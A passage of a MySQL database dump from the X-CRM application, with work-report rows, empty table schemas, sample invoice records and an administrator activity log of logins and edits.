INSERT INTO `xy_huibao` VALUES ('3', '16', '王晓丹', '2015-06-02 21:01:30', '16', '王晓丹', '2015-07-23 15:08:35', '0', '', 'xcs', '17,16,1', '张雨,王晓丹,陈高明', 'dcds ds', '1433250056', '\n王晓丹:asfadsfsdf2015-06-03 14:46:29\n王晓丹:112015-06-12 13:23:05\n王晓丹:asas2015-06-12 13:24:39\n王晓丹:2015-07-23 15:08:35');
INSERT INTO `xy_huibao` VALUES ('4', '16', '王晓丹', '2015-06-03 19:28:40', '0', '', '0000-00-00 00:00:00', '1', '日总结', '11', '18', '王倩', '&lt;table width=&quot;146&quot;&gt;\n	&lt;span&gt; &lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt; &lt;/span&gt;\n	&lt;tbody&gt;\n		&lt;tr&gt;\n			&lt;span&gt; &lt;/span&gt;\n			&lt;td width=&quot;74&quot; height=&quot;18&quot; align=&quot;right&quot;&gt;\n				&lt;span&gt;4月13日&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n			&lt;td width=&quot;72&quot; align=&quot;left&quot;&gt;\n				&lt;span&gt;李倩&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;/tr&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;tr&gt;\n			&lt;span&gt; &lt;/span&gt;\n			&lt;td height=&quot;18&quot; align=&quot;right&quot;&gt;\n				&lt;span&gt;4月13日&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n			&lt;td align=&quot;left&quot;&gt;\n				&lt;span&gt;发票&lt;/span&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;/tr&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;tr&gt;\n			&lt;span&gt; &lt;/span&gt;\n			&lt;td height=&quot;18&quot;&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n			&lt;td&gt;\n			&lt;/td&gt;\n&lt;span&gt; &lt;/span&gt;\n		&lt;/tr&gt;\n&lt;span&gt; &lt;/span&gt;\n	&lt;/tbody&gt;\n&lt;/table&gt;', '1433330852', '');
INSERT INTO `xy_huibao` VALUES ('6', '16', '王晓丹', '2015-07-18 16:07:36', '0', '', '0000-00-00 00:00:00', '1', '日总结', '11', '18', '王倩', '1111', '1437206837', '');
INSERT INTO `xy_huibao` VALUES ('7', '16', '王晓丹', '2015-08-02 20:49:42', '0', '', '0000-00-00 00:00:00', '1', '', '11', '', '', '', '1438519772', '');

-- ----------------------------
-- Table structure for `xy_huifang`
-- ----------------------------
DROP TABLE IF EXISTS `xy_huifang`;
CREATE TABLE `xy_huifang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `content` varchar(255) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='客户回访';

-- ----------------------------
-- Records of xy_huifang
-- ----------------------------

-- ----------------------------
-- Table structure for `xy_kaipiao`
-- ----------------------------
DROP TABLE IF EXISTS `xy_kaipiao`;
CREATE TABLE `xy_kaipiao` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `jine` int(11) NOT NULL,
  `piaohao` varchar(100) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='开票记录';

-- ----------------------------
-- Records of xy_kaipiao
-- ----------------------------
INSERT INTO `xy_kaipiao` VALUES ('1', '16', '王晓丹', '2015-06-02 18:28:42', '16', '王晓丹', '2015-06-03 16:17:50', '1', '3', 'CRM租赁版 百度', '百度公司', '1506020003', '1000', '123456789ABCD', '陈高明', '');
INSERT INTO `xy_kaipiao` VALUES ('2', '16', '王晓丹', '2015-06-02 18:38:52', '0', '', '0000-00-00 00:00:00', '1', '2', '美容院管理系统安装版', '深圳腾讯公司', '1506020002', '2147483647', '', '王旭东', '');

-- ----------------------------
-- Table structure for `xy_log`
-- ----------------------------
DROP TABLE IF EXISTS `xy_log`;
CREATE TABLE `xy_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `addtime` datetime NOT NULL,
  `username` char(20) NOT NULL,
  `content` char(100) NOT NULL,
  `os` varchar(100) NOT NULL,
  `url` char(100) NOT NULL,
  `ip` char(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=237 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_log
-- ----------------------------
INSERT INTO `xy_log` VALUES ('1', '2015-08-14 20:33:30', 'admin', '锁定20', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=lock', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('2', '2015-08-14 20:33:35', 'admin', '清理1条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=del', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('3', '2015-08-14 20:34:02', 'admin', '锁定110', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=lock', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('4', '2015-08-14 20:34:11', 'admin', '清理4条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Menu&a=del', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('5', '2015-08-14 20:34:26', 'admin', '编辑成功294', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('6', '2015-08-14 20:34:38', 'admin', '编辑成功300', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('7', '2015-08-14 20:34:50', 'admin', '编辑成功305', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('8', '2015-08-14 20:34:56', 'admin', '清理15条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=del', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('9', '2015-08-14 20:35:06', 'admin', '编辑成功292', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=edit', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('10', '2015-08-14 20:35:11', 'admin', '清理1条无用的记录', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Rule&a=del', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('11', '2015-08-14 20:35:39', 'admin', '编辑成功1', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=User&a=edit', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('12', '2015-08-14 20:35:42', 'admin', '退出成功！', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Public&a=logout', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('13', '2015-08-14 20:35:45', 'admin', '登录成功！', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)', '/x-crm2/index.php?m=Home&c=Public&a=Login', '127.0.0.1');
INSERT INTO `xy_log` VALUES ('14', '2018-09-17 16:59:17', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('15', '2018-09-17 17:02:25', 'admin', '新增成功214', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('16', '2018-09-17 17:06:18', 'admin', '新增成功215', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('17', '2018-09-17 17:10:21', 'admin', '编辑成功215', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('18', '2018-09-17 17:11:13', 'admin', '编辑成功214', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('19', '2018-09-17 17:18:40', 'admin', '锁定214', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('20', '2018-09-17 17:18:55', 'admin', '编辑成功214', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('21', '2018-09-17 17:19:05', 'admin', '启用214', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('22', '2018-09-17 17:19:12', 'admin', '锁定214', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('23', '2018-09-17 17:22:01', 'admin', '新增成功216', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('24', '2018-09-17 17:23:35', 'admin', '编辑成功216', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('25', '2018-09-17 17:24:20', 'admin', '新增成功217', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('26', '2018-09-17 17:25:17', 'admin', '编辑成功217', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('27', '2018-09-17 17:26:14', 'admin', '编辑成功216', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('28', '2018-09-17 17:27:00', 'admin', '编辑成功216', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('29', '2018-09-17 17:29:10', 'admin', '新增成功218', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('30', '2018-09-18 08:10:40', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('31', '2018-09-18 08:22:13', 'admin', '新增成功219', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('32', '2018-09-18 08:23:54', 'admin', '编辑成功217', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 ', '/X-CRM3/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('33', '2018-09-18 13:30:22', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('34', '2018-09-18 13:32:27', 'admin', '编辑成功1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('35', '2018-09-18 16:33:52', 'admin', '文件未上传成功', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('36', '2018-09-18 16:36:48', 'admin', '编辑成功1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('37', '2018-09-18 16:37:53', 'admin', '编辑成功1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('38', '2018-09-18 16:39:21', 'admin', '文件未上传成功', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('39', '2018-09-18 16:40:20', 'admin', '文件未上传成功', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('40', '2018-09-18 16:45:11', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('41', '2018-09-18 16:45:21', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('42', '2018-09-18 16:45:37', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('43', '2018-09-18 16:46:21', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safar', '/X-crm3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('44', '2018-09-20 08:51:57', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('45', '2018-09-20 08:54:15', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('46', '2018-10-18 08:38:34', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('47', '2018-10-18 08:47:17', 'admin', '锁定160', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Menu/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('48', '2018-10-18 08:47:46', 'admin', '清理10条无用的记录', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Menu/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('49', '2018-10-18 08:51:10', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('50', '2018-10-18 08:51:41', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('51', '2018-10-18 09:18:13', 'admin', '新增成功3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('52', '2018-10-18 09:41:10', 'admin', '新增成功4', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('53', '2018-10-18 09:45:59', 'admin', '新增成功5', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('54', '2018-10-18 11:00:18', 'admin', '新增成功6', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('55', '2018-10-20 10:35:06', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('56', '2018-10-22 08:47:20', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('57', '2018-10-22 08:55:30', 'admin', '新增成功7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('58', '2018-10-22 08:58:14', 'admin', '新增成功8', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('59', '2018-10-22 09:10:04', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('60', '2018-10-22 09:14:58', 'admin', '新增成功9', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('61', '2018-10-22 09:22:34', 'admin', '新增成功10', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('62', '2018-10-22 10:55:57', 'admin', '新增成功11', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('63', '2018-10-22 10:59:49', 'admin', '新增成功12', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('64', '2018-10-22 11:01:30', 'admin', '数据表\'xy_app_member\'优化完成！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Database/optimize.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('65', '2018-10-22 11:01:38', 'admin', '数据表\'xy_auth_group_access\'修复完成！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Database/repair.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('66', '2018-10-22 13:05:12', 'admin', '新增成功13', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('67', '2018-10-22 13:07:06', 'admin', '新增成功14', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('68', '2018-10-22 13:12:04', 'admin', '新增成功15', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('69', '2018-10-22 13:12:32', 'admin', '新增成功16', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('70', '2018-10-22 13:14:28', 'admin', '新增成功17', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('71', '2018-10-23 13:30:36', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('72', '2018-10-24 11:44:20', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('73', '2018-10-24 13:04:53', 'admin', '新增成功18', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('74', '2018-10-24 13:05:51', 'admin', '新增成功19', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('75', '2018-10-24 13:08:03', 'admin', '新增成功20', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('76', '2018-10-24 13:11:13', 'admin', '新增成功21', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('77', '2018-10-24 13:12:09', 'admin', '新增成功22', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('78', '2018-10-24 13:13:01', 'admin', '新增成功23', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('79', '2018-10-24 13:13:41', 'admin', '新增成功24', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('80', '2018-10-24 13:18:29', 'admin', '新增成功25', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/X-CRM3/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('81', '2018-10-24 15:57:02', 'admin', '编辑成功218', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
